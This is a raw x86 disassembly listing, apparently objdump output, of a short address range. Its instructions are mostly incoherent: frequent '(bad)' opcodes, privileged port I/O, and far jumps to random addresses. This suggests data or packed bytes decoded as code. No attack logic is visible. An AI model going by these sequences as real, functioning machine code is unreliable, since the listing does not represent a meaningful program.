  415776:	adc    ebp,DWORD PTR [eiz*4+0x567c1afb]
  41577d:	jmp    0x292d83ce
  415782:	test   BYTE PTR [edi+0x7c1ec7f2],bl
  415788:	mov    esp,0xb7816607
  41578d:	in     al,dx
  41578e:	into   
  41578f:	or     eax,DWORD PTR [eax-0x3c]
  415792:	rol    ebp,0x14
  415795:	cwde   
  415796:	add    eax,0xef095b4b
  41579b:	or     eax,0xf32b1fbd
  4157a0:	out    0x1a,al
  4157a2:	test   DWORD PTR [esi-0x28],0x216d29c6
  4157a9:	push   ss
  4157aa:	xor    DWORD PTR [esi+0x27],ebp
  4157ad:	adc    eax,DWORD PTR [esi+0x70eca3df]
  4157b3:	cld    
  4157b4:	cmp    cl,BYTE PTR [eax+0x50]
  4157b7:	push   ecx
  4157b8:	sti    
  4157b9:	hlt    
  4157ba:	pop    ecx
  4157bb:	fstp   QWORD PTR [ebp+0x4f4234b0]
  4157c1:	stos   DWORD PTR es:[edi],eax
  4157c2:	sub    eax,0x3d0ba61b
  4157c7:	out    0x43,eax
  4157c9:	lods   eax,DWORD PTR ds:[esi]
  4157ca:	mov    edi,0x153ee60c
  4157cf:	xchg   edx,eax
  4157d0:	(bad)  
  4157d1:	call   0x9012ff0e
  4157d6:	push   ecx
  4157d7:	stos   DWORD PTR es:[edi],eax
  4157d8:	mov    ecx,edx
  4157da:	ficomp WORD PTR [esi-0x70b44ffc]
  4157e0:	push   esp
  4157e1:	mov    ecx,0x959633d7
  4157e6:	push   ebx
  4157e7:	xchg   esi,eax
  4157e8:	or     bh,BYTE PTR [edi+0x4caad1c9]
  4157ee:	sbb    bh,BYTE PTR [ebp+0x6b]
  4157f1:	(bad)  
  4157f2:	xor    BYTE PTR [eax-0x45e00d13],cl
  4157f8:	mov    esp,edx
  4157fa:	push   0x70
  4157fc:	(bad)  
  4157fd:	daa    
  4157fe:	cwde   
  4157ff:	jmp    0xae46:0x88ceed27
  415806:	dec    ecx
  415807:	add    al,0x14
  415809:	test   al,0xd7
  41580b:	in     eax,dx
  41580c:	clc    
  41580d:	fwait
  41580e:	add    eax,0xd067b8cb
  415813:	pop    ds
  415814:	mov    ds:0xa31c99e2,eax
  415819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41581a:	test   DWORD PTR [ebp-0x15],ecx
  41581d:	mov    cl,0x7d
  41581f:	dec    edi
  415820:	dec    edx
  415821:	div    BYTE PTR [edi+0x7ee7941a]
  415827:	rcr    ah,cl
  415829:	pop    ss
  41582a:	adc    cl,cl
  41582c:	mov    ah,0x29
  41582e:	xor    eax,0x35655036
  415833:	data16 jns 0x4157c4
  415836:	push   ds
  415837:	jne    0x415826
  415839:	xchg   BYTE PTR [esi-0x7d577963],bl
  41583f:	jno    0x4157d0
  415841:	push   ebx
  415842:	sub    dl,ah
  415844:	sahf   
  415845:	mov    bl,0xd0
  415847:	not    DWORD PTR ds:0x78b80f65
  41584d:	or     eax,0xa69553a
  415852:	les    esi,FWORD PTR [ecx]
  415854:	sub    BYTE PTR [edx+0x47348afa],cl
  41585a:	and    BYTE PTR [esi+edi*1-0x6],ah
  41585e:	and    BYTE PTR [edx+edx*8],dh
  415861:	pusha  
  415862:	inc    esp
  415863:	popa   
  415864:	fimul  DWORD PTR [ecx-0x4c48643b]
  41586a:	std    
  41586b:	stos   DWORD PTR es:[edi],eax
  41586c:	push   es
  41586d:	push   edi
  41586e:	and    BYTE PTR [ecx+0x67abe510],cl
  415874:	jp     0x4158a8
  415876:	xor    DWORD PTR [edx],edx
  415878:	(bad)  
  415879:	xlat   BYTE PTR ds:[ebx]
  41587a:	addr16 dec edi
  41587c:	push   ecx
  41587d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41587e:	or     cl,BYTE PTR [edi+0x4ca1cd20]
  415884:	or     al,0xd6
  415886:	mov    ecx,0x349b736b
  41588b:	rcl    edi,0xea
  41588e:	add    dl,BYTE PTR [ebx+0x18]
  415891:	add    DWORD PTR [ebx],edi
  415893:	aad    0x45
  415895:	inc    esp
  415896:	das    
  415897:	into   
  415898:	push   ss
  415899:	or     DWORD PTR [edi],esi
  41589b:	(bad)  
  41589c:	nop
  41589d:	mov    al,ds:0x64a5c934
  4158a2:	clc    
  4158a3:	retf   
  4158a4:	ins    BYTE PTR es:[edi],dx
  4158a5:	rol    edx,1
  4158a7:	not    esp
  4158a9:	inc    esp
  4158aa:	and    eax,0x3feeed60
  4158af:	push   ss
  4158b0:	add    bl,ch
  4158b2:	dec    edx
  4158b3:	xchg   DWORD PTR [edx+0x59],ebx
  4158b6:	stc    
  4158b7:	call   FWORD PTR [eax+0x35]
  4158ba:	push   ebx
  4158bb:	mov    cl,BYTE PTR [esi+ebp*2-0x12]
  4158bf:	imul   eax,esp,0x32
  4158c2:	aaa    
  4158c3:	cli    
  4158c4:	mov    ah,0x8f
  4158c6:	xor    bh,BYTE PTR [ecx-0x6ad5392e]
  4158cc:	mov    BYTE PTR [ecx+0x32e1ad9f],0x6d
  4158d3:	mov    esp,0x555f7e0c
  4158d8:	sub    al,0x10
  4158da:	frstor [esi+0x6a]
  4158dd:	push   esp
  4158de:	inc    ebx
  4158df:	mov    esi,0xbec73fa9
  4158e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158e5:	and    eax,0x154e225e
  4158ea:	xchg   edi,eax
  4158eb:	mov    al,ds:0xf7b17f32
  4158f0:	in     eax,dx
  4158f1:	ret    0xaace
  4158f4:	push   ds
  4158f5:	cli    
  4158f6:	ffreep st(2)
  4158f8:	jne    0x415893
  4158fa:	in     al,dx
  4158fb:	mov    ebp,0xa84d2b17
  415900:	cmp    DWORD PTR gs:[esi-0x4058a44a],edx
  415907:	push   edx
  415908:	sub    al,0xa1
  41590a:	arpl   WORD PTR [esi+esi*1+0x5a3dcec1],sp
  415911:	jmp    0x415912
  415913:	(bad)  
  415914:	fldcw  WORD PTR [esi+0x5f]
  415917:	xlat   BYTE PTR ds:[ebx]
  415918:	test   al,0xe3
  41591a:	popa   
  41591b:	int3   
  41591c:	pop    ss
  41591d:	in     eax,dx
  41591e:	ficom  WORD PTR [ebx-0x3c]
  415921:	(bad)  
  415922:	sbb    eax,DWORD PTR [esp+esi*2-0x67bf18f]
  415929:	lods   al,BYTE PTR ds:[esi]
  41592a:	add    BYTE PTR [eax],al
  41592c:	sar    BYTE PTR [edx+0x10c86ebf],0x3f
  415933:	sbb    BYTE PTR [ecx+0x3f],bl
  415936:	fwait
  415937:	push   0x24
  415939:	adc    eax,0xa3f8c9e1
  41593e:	lds    ebx,FWORD PTR [edi+0x10]
  415941:	xchg   edi,eax
  415942:	rcl    BYTE PTR [esi-0x531f9783],0xb5
  415949:	imul   esp,DWORD PTR [ecx+0x64],0xde5067f3
  415950:	sbb    al,0xc1
  415952:	in     eax,0xed
  415954:	cld    
  415955:	lods   eax,DWORD PTR ds:[esi]
  415956:	outs   dx,DWORD PTR ds:[esi]
  415957:	xor    esp,0xc52d6f5b
  41595d:	ds jnp 0x415985
  415960:	sti    
  415961:	mov    edx,ebp
  415963:	push   ebp
  415964:	jle    0x415964
  415966:	repnz mov dl,0xc9
  415969:	add    eax,0x887c29df
  41596e:	clc    
  41596f:	xor    eax,0x8b978107
  415974:	mov    BYTE PTR [ebp-0x3456bded],cl
  41597a:	mov    eax,ds:0xee176571
  41597f:	xchg   edi,eax
  415980:	lock xchg edx,eax
  415982:	sbb    ch,cl
  415984:	outs   dx,DWORD PTR ds:[esi]
  415985:	test   al,0x8b
  415987:	retf   
  415988:	and    DWORD PTR [edi+0x4e],ebx
  41598b:	ffreep st(0)
  41598d:	scas   al,BYTE PTR es:[edi]
  41598e:	sub    eax,0xc10cae30
  415993:	pop    edi
  415994:	sbb    edx,0x2678287c
  41599a:	push   ebx
  41599b:	repnz adc eax,0x34e9d936
  4159a1:	retf   0xdac1
  4159a4:	fdiv   QWORD PTR [eax-0x1]
  4159a7:	dec    edi
  4159a8:	fcomp  QWORD PTR [ebx+eiz*4+0x42a0aa99]
  4159af:	cmc    
  4159b0:	fs dec ebx
  4159b2:	add    ebx,ebx
  4159b4:	jecxz  0x415989
  4159b6:	mov    eax,ds:0xec24e963
  4159bb:	stc    
  4159bc:	push   esp
  4159bd:	int    0x47
  4159bf:	xchg   edi,eax
  4159c0:	les    edx,FWORD PTR [edx+0x2c1f33f8]
  4159c6:	rcr    DWORD PTR [esi+0x2e],1
  4159c9:	fist   WORD PTR [edx+0x0]
  4159cc:	or     edx,DWORD PTR [ebx+ebp*1-0x20]
  4159d0:	out    0x11,al
  4159d2:	mov    ebp,0x4304a8e2
  4159d7:	fs mov al,0x91
  4159da:	push   cs
  4159db:	lahf   
  4159dc:	int    0x29
  4159de:	out    0xee,al
  4159e0:	mov    BYTE PTR [ebx+0x3c],dh
  4159e3:	mov    esi,0x937f2dd2
  4159e8:	aaa    
  4159e9:	jae    0x415a06
  4159eb:	jne    0x41597b
  4159ed:	mov    bl,0x80
  4159ef:	adc    eax,0xed75c7c
  4159f4:	stos   DWORD PTR es:[edi],eax
  4159f5:	dec    edx
  4159f6:	rol    DWORD PTR [edx+0x59],1
  4159f9:	pushf  
  4159fa:	cmp    esp,DWORD PTR [edi]
  4159fc:	call   0xa878:0x76a11df5
  415a03:	mov    edx,0x673dc63d
  415a08:	icebp  
  415a09:	inc    edx
  415a0a:	cld    
  415a0b:	(bad)  
  415a0d:	in     al,dx
  415a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a0f:	shr    BYTE PTR [ecx-0x2a9e93aa],0xb3
  415a16:	sbb    DWORD PTR [ecx],0xdb5a2a10
  415a1c:	popfw  
  415a1e:	enter  0x3670,0xac
  415a22:	mov    esi,0x1c23d9d4
  415a27:	jmp    0xfad73939
  415a2c:	shl    DWORD PTR [ecx+0x6e],cl
  415a2f:	and    dh,ah
  415a31:	fsubr  st(4),st
  415a33:	push   ebx
  415a34:	(bad)  
  415a35:	cmp    ebx,DWORD PTR [ebx+0x2308c8c8]
  415a3b:	les    ebp,FWORD PTR [edx-0x2fc3ca33]
  415a41:	mov    dl,0xa0
  415a43:	ret    0xca0
  415a46:	mov    ch,0x6f
  415a48:	xchg   edi,eax
  415a49:	jmp    0xd1a6:0x39adf0d0
  415a50:	enter  0xd5e5,0x6a
  415a54:	xor    eax,0x6ff107a9
  415a59:	outs   dx,DWORD PTR ds:[esi]
  415a5a:	stc    
  415a5b:	es popa 
  415a5d:	xchg   esp,eax
  415a5e:	jne    0x415a27
  415a60:	js     0x415a1b
  415a62:	(bad)  
  415a63:	push   ecx
  415a64:	aam    0xf0
  415a66:	inc    esi
  415a67:	and    eax,0x9f3e75df
  415a6c:	mov    cl,0xd0
  415a6e:	sahf   
  415a6f:	dec    esi
  415a70:	call   0x9f1eddce
  415a75:	dec    ebx
  415a76:	add    eax,0x82040e1b
  415a7b:	and    DWORD PTR [edx-0x4a066684],edi
  415a81:	adc    al,BYTE PTR [edi+0x6348e5bc]
  415a87:	xchg   ebx,eax
  415a88:	(bad)
  415a8b:	scas   al,BYTE PTR es:[edi]
  415a8c:	enter  0x4e15,0x8e
  415a90:	mov    esp,0xe14377ed
  415a95:	sbb    BYTE PTR [ecx+ebp*8-0x56c00d2a],bh
  415a9c:	mov    ?,WORD PTR [esi]
  415a9e:	mov    dl,0xf2
  415aa0:	into   
  415aa1:	xor    al,BYTE PTR [eax]
  415aa3:	jbe    0x415aa7
  415aa5:	shl    DWORD PTR [edi-0x1234e8e7],0xb9
  415aac:	loopne 0x415acb
  415aae:	mov    al,ds:0x5588105b
  415ab3:	jmp    0x2768:0xc7574b44
  415aba:	xor    ebp,DWORD PTR [esi+0x68aca70b]
  415ac0:	shl    BYTE PTR [esi-0x42],cl
  415ac3:	cmp    BYTE PTR [ecx+0x2a],al
  415ac6:	pop    ss
  415ac7:	jmp    ecx
  415ac9:	and    DWORD PTR [eax],edi
  415acb:	shl    DWORD PTR [ebp-0x6ef4b529],cl
  415ad1:	data16 or cl,BYTE PTR [ebx+0x27]
  415ad5:	aaa    
  415ad6:	jecxz  0x415b29
  415ad8:	dec    edi
  415ad9:	pop    eax
  415ada:	ficom  WORD PTR [esi]
  415adc:	mov    esp,0xe5aedc20
  415ae1:	cld    
  415ae2:	aam    0xc1
  415ae4:	inc    esp
  415ae5:	pusha  
  415ae6:	xlat   BYTE PTR ds:[ebx]
  415ae7:	popa   
  415ae8:	loop   0x415b11
  415aea:	jp     0x415ac4
  415aec:	bound  ebx,QWORD PTR [ecx]
  415aee:	and    ebx,eax
  415af0:	adc    eax,0xbe945b7
  415af5:	add    esi,DWORD PTR [esi+0x28fa7e3a]
  415afb:	not    al
  415afd:	cld    
  415afe:	lea    esi,[ebx]
  415b00:	(bad)  
  415b01:	cli    
  415b02:	fsubr  QWORD PTR [eax]
  415b04:	aas    
  415b05:	xchg   esi,eax
  415b06:	jmp    0x415b5b
  415b08:	cmp    ah,BYTE PTR [eax-0x3df716ec]
  415b0e:	mov    esi,0x9f8602fa
  415b13:	daa    
  415b14:	retf   
  415b15:	or     ebx,edx
  415b17:	pop    es
  415b18:	outs   dx,DWORD PTR ds:[esi]
  415b19:	push   cs
  415b1a:	mov    bh,0x5d
  415b1c:	inc    esp
  415b1d:	jl     0x415b7c
  415b1f:	or     DWORD PTR [ebp+0x23],0x6ff50f96
  415b26:	retf   
  415b27:	dec    ebx
  415b28:	call   0xf0f133a
  415b2d:	mov    dl,0x81
  415b2f:	clc    
  415b30:	cmp    al,0x66
  415b32:	retf   
  415b33:	push   es
  415b34:	pusha  
  415b35:	popf   
  415b36:	jle    0x415b7d
  415b38:	stos   BYTE PTR es:[edi],al
  415b39:	daa    
  415b3a:	fs call 0x1865:0x645c9ade
  415b42:	cmp    dl,BYTE PTR [edi]
  415b44:	or     edx,DWORD PTR [ecx-0x1d7d53a]
  415b4a:	test   al,0xe5
  415b4c:	dec    ebx
  415b4d:	push   ds
  415b4e:	add    dl,ah
  415b50:	jmp    0x415b5b
  415b52:	pusha  
  415b53:	mov    bh,0x92
  415b55:	jl     0x415b1f
  415b57:	add    DWORD PTR [ecx+0x5dbce2de],eax
  415b5d:	jo     0x415b7e
  415b5f:	dec    esi
  415b60:	jno    0x415b2a
  415b62:	lea    eax,[esi]
  415b64:	push   0xcec53e47
  415b69:	daa    
  415b6a:	pop    es
  415b6b:	inc    esi
  415b6c:	ret    0x624
  415b6f:	(bad)  
  415b70:	imul   esp,DWORD PTR [ebx-0x2529a8bb],0xa39862ea
  415b7a:	lahf   
  415b7b:	sub    al,0xbb
  415b7d:	push   ecx
  415b7e:	test   BYTE PTR [ebp+0x12f1f111],dh
  415b84:	(bad)  
  415b86:	lock mov ch,ah
  415b89:	or     ebp,DWORD PTR [edi+0x1d77435e]
  415b8f:	sbb    ebp,DWORD PTR [ebx-0x115e032f]
  415b95:	ds aam 0x6e
  415b98:	ror    BYTE PTR [eax-0x6f1ed090],1
  415b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b9f:	cmc    
  415ba0:	test   eax,0xaddf71a3
  415ba5:	ficom  WORD PTR [eax+0x32a12366]
  415bab:	mov    ebx,DWORD PTR ds:[edi-0x6d]
  415baf:	cmp    edi,esi
  415bb1:	ror    DWORD PTR [ebp-0x127b6ad5],cl
  415bb7:	fcmovnu st,st(0)
  415bb9:	dec    edi
  415bba:	mov    ah,0x77
  415bbc:	mov    ds,WORD PTR [edi]
  415bbe:	mov    ebx,0x1b9a59d2
  415bc3:	call   0x1783b86e
  415bc8:	mov    WORD PTR [edx-0x357ee406],ds
  415bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bcf:	and    al,0x60
  415bd1:	ja     0x415c2e
  415bd3:	cmp    eax,0x69e3102a
  415bd8:	xchg   esp,eax
  415bd9:	aam    0xae
  415bdb:	xor    ch,BYTE PTR ds:0xe94ffd70
  415be1:	inc    ebp
  415be2:	scas   al,BYTE PTR es:[edi]
  415be3:	or     bh,ch
  415be5:	push   0xffffffab
  415be7:	shr    BYTE PTR [eax+0x1a],cl
  415bea:	rcl    dl,0xc1
  415bed:	jno    0x415b89
  415bef:	sti    
  415bf0:	shl    esp,cl
  415bf2:	mov    dl,0xdb
  415bf4:	arpl   si,si
  415bf6:	add    esp,DWORD PTR [eax+0x3c274777]
  415bfc:	cdq    
  415bfd:	frstor [ebp+0x67]
  415c00:	cld    
  415c01:	pop    ss
  415c02:	dec    ebp
  415c03:	or     edx,DWORD PTR [ebx]
  415c05:	into   
  415c06:	mov    ebp,0x30ab246e
  415c0b:	sbb    al,0x3a
  415c0d:	pop    ds
  415c0e:	pop    ds
  415c0f:	outs   dx,BYTE PTR ds:[esi]
  415c10:	repnz lock cmp DWORD PTR [esi],ebx
  415c14:	loop   0x415c0f
  415c16:	out    dx,al
  415c17:	call   0xb861a9b0
  415c1c:	test   eax,0x791b589e
  415c21:	cmp    edi,ecx
  415c23:	hlt    
  415c24:	mov    DWORD PTR [eax-0x3f],esp
  415c27:	xchg   edi,eax
  415c28:	xor    eax,0x73aa4c46
  415c2d:	sub    bl,BYTE PTR [eax+0x4014021b]
  415c33:	jnp    0x415c85
  415c35:	into   
  415c36:	(bad)  
  415c37:	sbb    esp,DWORD PTR ds:0xba86a02e
  415c3d:	mov    ecx,0xd7d4166
  415c42:	pushf  
  415c43:	fisttp DWORD PTR [ecx-0x93d1531]
  415c49:	jo     0x415c0b
  415c4b:	stc    
  415c4c:	and    al,0x60
  415c4e:	xchg   esi,eax
  415c4f:	fild   WORD PTR [ebx-0x7a288f4a]
  415c55:	je     0x415bf4
  415c57:	and    BYTE PTR [ecx-0x6592e3a6],0x44
  415c5e:	push   0xc4dfc4d3
  415c63:	inc    edi
  415c64:	mov    al,0x88
  415c67:	inc    ecx
  415c68:	mov    al,ds:0xd621a404
  415c6d:	mov    ebx,0x73b99fbc
  415c72:	shr    DWORD PTR [ebp-0xa151938],0xad
  415c79:	aam    0xbb
  415c7b:	fwait
  415c7c:	int3   
  415c7d:	dec    edx
  415c7e:	mov    esi,0xdb9aa590
  415c83:	ja     0x415cd1
  415c85:	pop    ebp
  415c86:	inc    edx
  415c87:	inc    ecx
  415c88:	fmul   DWORD PTR [ecx]
  415c8a:	cmp    eax,0xea23ada4
  415c8f:	loop   0x415cc2
  415c91:	adc    al,0xc
  415c93:	add    BYTE PTR [ebx-0x71],0xff
  415c97:	repz push edx
  415c99:	sbb    esi,ecx
  415c9b:	push   ebx
  415c9c:	mov    esi,0x8994da78
  415ca1:	and    bl,BYTE PTR [ecx-0x29f1696b]
  415ca7:	jb     0x415c2a
  415ca9:	push   ss
  415caa:	xor    bh,cl
  415cac:	std    
  415cad:	pop    ecx
  415cae:	addr16 xchg ebp,eax
  415cb0:	pop    ds
  415cb1:	sub    al,0x67
  415cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cb4:	push   ecx
  415cb5:	inc    esp
  415cb6:	xor    eax,0xe2323e15
  415cbb:	enter  0x5306,0x45
  415cbf:	(bad)  
  415cc0:	call   0x4bbed765
  415cc5:	lods   eax,DWORD PTR ds:[esi]
  415cc6:	xchg   esp,eax
  415cc7:	sbb    ah,BYTE PTR [ecx-0x7a1e7fc7]
  415ccd:	mov    ah,0xfd
  415ccf:	popf   
  415cd0:	in     al,dx
  415cd1:	xchg   ebx,eax
  415cd2:	test   al,0xbc
  415cd4:	(bad)
  415cd7:	cmp    al,0x86
  415cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cda:	mov    BYTE PTR [ebx-0x7a],ch
  415cdd:	xchg   ecx,eax
  415cde:	inc    ebp
  415cdf:	ror    BYTE PTR [edx+0x5fcefcc6],0xd6
  415ce6:	mov    edi,ss
  415ce8:	in     al,dx
  415ce9:	jp     0x415ceb
  415ceb:	jmp    0x52a56033
  415cf0:	(bad)
  415cf4:	xor    eax,DWORD PTR ds:0xf29d3df2
  415cfa:	sub    al,0x4
  415cfc:	adc    BYTE PTR [edi+0x25],0xcf
  415d00:	call   0x481d21f4
  415d05:	dec    ebx
  415d06:	pop    edi
  415d07:	xchg   edx,eax
  415d08:	mov    ch,0xe4
  415d0a:	int    0xe6
  415d0c:	adc    eax,0x9c3ab01b
  415d11:	jle    0x415d47
  415d13:	sbb    al,0x8c
  415d15:	clc    
  415d16:	and    BYTE PTR [ebp+ecx*1+0xc6cf1ca],0xed
  415d1e:	cmp    dl,ah
  415d20:	add    eax,0xe2f20c2a
  415d25:	fnstcw WORD PTR [ebx+0x44dbcb6f]
  415d2b:	imul   edi,DWORD PTR [ebx+0x3a],0xffffffe9
  415d2f:	add    esp,DWORD PTR [ebp+0x227da5af]
  415d35:	(bad)
  415d39:	push   ebp
  415d3a:	fnsave [edi-0x4b612658]
  415d40:	jns    0x415d8d
  415d42:	lods   al,BYTE PTR ds:[esi]
  415d43:	enter  0x3e6a,0xa8
  415d47:	push   es
  415d48:	idiv   BYTE PTR [esp+edx*4]
  415d4b:	push   esp
  415d4c:	ja     0x415cfb
  415d4e:	push   ebx
  415d4f:	gs cmc 
  415d51:	loop   0x415dbc
  415d53:	and    esi,DWORD PTR [ebp+0x3b]
  415d56:	adc    edx,DWORD PTR [ecx-0x1156292a]
  415d5c:	and    al,0xca
  415d5e:	mov    dl,0x6a
  415d60:	cdq    
  415d61:	or     dl,dh
  415d63:	xchg   edi,eax
  415d64:	xor    al,0xb5
  415d66:	stos   BYTE PTR es:[edi],al
  415d67:	jno    0x415d0f
  415d69:	xchg   esp,eax
  415d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d6b:	mov    bh,0xa7
  415d6d:	aam    0x62
  415d6f:	(bad)  
  415d71:	fisub  WORD PTR [ecx]
  415d73:	cmp    edx,DWORD PTR [esi+0x68]
  415d76:	add    DWORD PTR [esi+0x6e],eax
  415d79:	enter  0x3ada,0x28
  415d7d:	mov    bl,0x1
  415d7f:	mov    ds:0x4acaeea3,al
  415d84:	sbb    eax,0x19e5bf96
  415d89:	pop    edi
  415d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d8b:	adc    al,0x3b
  415d8d:	and    ecx,DWORD PTR [esi+0x3f4faab3]
  415d93:	xchg   ecx,eax
  415d94:	retf   0x65d
  415d97:	lods   eax,DWORD PTR ds:[esi]
  415d98:	pop    es
  415d99:	je     0x415d2a
  415d9b:	dec    ebp
  415d9c:	lea    edx,ds:0xa125df49
  415da2:	mov    bh,0x18
  415da4:	arpl   WORD PTR ds:0xd37428ca,di
  415daa:	stos   DWORD PTR es:[edi],eax
  415dab:	stc    
  415dac:	(bad)  
  415dad:	int3   
  415dae:	or     esp,DWORD PTR [edx]
  415db0:	popa   
  415db1:	(bad)  
  415db2:	les    ebp,FWORD PTR [ebx-0x28]
  415db5:	test   al,0x45
  415db7:	daa    
  415db8:	jp     0x415d74
  415dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dbb:	cmp    bh,al
  415dbd:	out    0x79,al
  415dbf:	cmp    DWORD PTR [ebx+edx*2],0xffffffeb
  415dc3:	icebp  
  415dc4:	mov    ds:0xeebdf6c6,al
  415dc9:	test   al,0xc6
  415dcb:	aas    
  415dcc:	retf   0xe2a1
  415dcf:	jp     0x415e21
  415dd1:	adc    DWORD PTR [esi-0x5c385b1b],edi
  415dd7:	xor    DWORD PTR [edi-0x3c],ecx
  415dda:	comiss xmm1,DWORD PTR [ecx-0x1a677a10]
  415de1:	jmp    0x415e38
  415de3:	xchg   ebx,eax
  415de4:	(bad)  
  415de5:	std    
  415de6:	add    eax,0x5db97f9d
  415deb:	lea    esi,[ebx]
  415ded:	mov    ecx,0xe36c733a
  415df2:	pop    ss
  415df3:	push   ss
  415df4:	(bad)  
  415df5:	call   0x9241:0xab6f0118
  415dfc:	jbe    0x415e70
  415dfe:	and    DWORD PTR [edx+0x3777b31a],0xffffff93
  415e05:	sti    
  415e06:	(bad)  [edi-0x7e]
  415e09:	sbb    bl,dl
  415e0b:	push   ebx
  415e0c:	add    al,0x1f
  415e0e:	mov    dl,0x1b
  415e10:	in     al,dx
  415e11:	mov    ebp,0xfaf14fa2
  415e16:	pop    ds
  415e17:	jge    0x415e87
  415e19:	stos   BYTE PTR es:[edi],al
  415e1a:	or     esp,edx
  415e1c:	sub    edx,DWORD PTR [edi+ebx*1-0x6a]
  415e20:	ret    0x7001
  415e23:	enter  0xa9d0,0xdd
  415e27:	pop    edi
  415e28:	mov    al,0x3a
  415e2a:	test   BYTE PTR [edx],0x15
  415e2d:	jbe    0x415e13
  415e2f:	loop   0x415e28
  415e31:	imul   edx,DWORD PTR [eax-0x506d1b53],0x43943936
  415e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e3c:	xchg   ebp,eax
  415e3d:	loopne 0x415eb3
  415e3f:	retf   0xc95
  415e42:	push   ebp
  415e43:	std    
  415e44:	ret    0xd150
  415e47:	inc    edi
  415e48:	push   0xc259222d
  415e4d:	mov    dl,0x51
  415e4f:	sub    bh,dh
  415e51:	pop    esp
  415e52:	inc    ecx
  415e53:	adc    eax,0x6668a1e8
  415e58:	cdq    
  415e59:	xor    DWORD PTR [ebx+0x19],ecx
  415e5c:	sbb    DWORD PTR ss:[ecx-0x9],esi
  415e60:	push   es
  415e61:	mov    ds:0x335339a4,eax
  415e66:	dec    ebx
  415e67:	mov    edi,0xc626b967
  415e6c:	stos   DWORD PTR es:[edi],eax
  415e6d:	push   esp
  415e6e:	iret   
  415e6f:	cmp    ah,bl
  415e71:	inc    esp
  415e72:	inc    ecx
  415e73:	jmp    0x34a:0x3ad2e50c
  415e7a:	cmp    eax,0x3ca79c5c
  415e7f:	and    eax,DWORD PTR [edi+edi*8]
  415e82:	cmp    ebx,DWORD PTR [esi+0x1b]
  415e85:	push   ebx
  415e86:	cdq    
  415e87:	outs   dx,DWORD PTR ds:[esi]
  415e88:	pop    es
  415e89:	outs   dx,DWORD PTR ds:[esi]
  415e8a:	icebp  
  415e8b:	jg     0x6a4510b8
  415e91:	and    eax,0xfebaa4f5
  415e96:	jno    0x415e4d
  415e98:	lock inc ebp
  415e9a:	xchg   BYTE PTR [ecx+0xe],bh
  415e9d:	dec    di
  415e9f:	adc    eax,0xb8b4f88e
  415ea4:	jg     0x415e5e
  415ea6:	or     DWORD PTR ds:0xd0ae983b,0xb22034e1
  415eb0:	sub    eax,0xe65abf3c
  415eb5:	cmp    DWORD PTR [edi-0x7b],eax
  415eb8:	add    al,0x6e
  415eba:	mov    ?,WORD PTR [ebp+0x3c526848]
  415ec0:	mov    BYTE PTR [ecx-0x575da751],dh
  415ec6:	stc    
  415ec7:	pop    ss
  415ec8:	stos   BYTE PTR es:[edi],al
  415ec9:	xchg   DWORD PTR [ebx+edi*2-0x7ab5c771],esi
  415ed0:	or     DWORD PTR [eax+0xb],esi
  415ed3:	in     al,dx
  415ed4:	jno    0x415e94
  415ed6:	mov    ds:0x3b36cb2d,al
  415edb:	pop    esp
  415edc:	push   0xffffffb4
  415ede:	inc    esi
  415edf:	enter  0xd1b7,0x39
  415ee3:	cvtps2pi mm1,QWORD PTR [edx]
  415ee6:	add    BYTE PTR [edx+0x27],bh
  415ee9:	xchg   edx,eax
  415eea:	cmp    al,0xc7
  415eec:	pop    esp
  415eed:	xchg   DWORD PTR [edx+0x622ab495],eax
  415ef3:	neg    BYTE PTR [ecx]
  415ef5:	into   
  415ef6:	jle    0x415f67
  415ef8:	mov    edi,0x8f89f0e4
  415efd:	nop
  415efe:	lahf   
  415eff:	sbb    BYTE PTR [edi-0x38701e52],dl
  415f05:	pop    ebx
  415f06:	shl    BYTE PTR [edi+0x13],cl
  415f09:	clc    
  415f0a:	push   ebp
  415f0b:	adc    BYTE PTR [ebx+0xd],ah
  415f0e:	or     ebx,ebx
  415f10:	mov    ah,0x7b
  415f12:	adc    BYTE PTR [edi+0x42],bh
  415f15:	hlt    
  415f16:	leave  
  415f17:	mov    cl,BYTE PTR [ecx-0x4a]
  415f1a:	stos   DWORD PTR es:[edi],eax
  415f1b:	fimul  WORD PTR [esi+0x25]
  415f1e:	xchg   edx,eax
  415f1f:	clc    
  415f20:	mov    ch,0x3f
  415f22:	sbb    BYTE PTR [edi-0x13],dh
  415f25:	leave  
  415f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f27:	test   DWORD PTR [ebp-0x42],0x7943fe69
  415f2e:	or     ah,bl
  415f30:	call   DWORD PTR [eax]
  415f32:	mov    dh,0x80
  415f34:	jno    0x415f6a
  415f36:	push   edx
  415f37:	xchg   edi,eax
  415f38:	pusha  
  415f39:	in     eax,0xfe
  415f3b:	rcl    DWORD PTR [edi-0x26],1
  415f3e:	or     bl,BYTE PTR [ebp+0x63]
  415f41:	leave  
  415f42:	cmc    
  415f43:	add    bh,bh
  415f45:	dec    esp
  415f46:	xor    bl,BYTE PTR [ecx+0x7225e215]
  415f4c:	mov    dl,0x2d
  415f4e:	pop    ss
  415f4f:	or     dh,dh
  415f51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f52:	pop    ebx
  415f53:	in     eax,0x79
  415f55:	mov    dh,BYTE PTR [esi]
  415f57:	push   eax
  415f58:	mov    ebp,0xadf10aa8
  415f5d:	arpl   WORD PTR [esp+esi*4+0x63efafe6],dx
  415f64:	mov    esi,0xdc1f1435
  415f69:	cmp    al,0x90
  415f6b:	retf   
  415f6c:	popf   
  415f6d:	push   cs
  415f6e:	adc    eax,0xf27eac87
  415f73:	jge    0x415f43
  415f75:	aad    0x24
  415f77:	retf   
  415f78:	push   es
  415f79:	jle    0x415f85
  415f7b:	pop    ebp
  415f7c:	xchg   ebp,eax
  415f7d:	pop    es
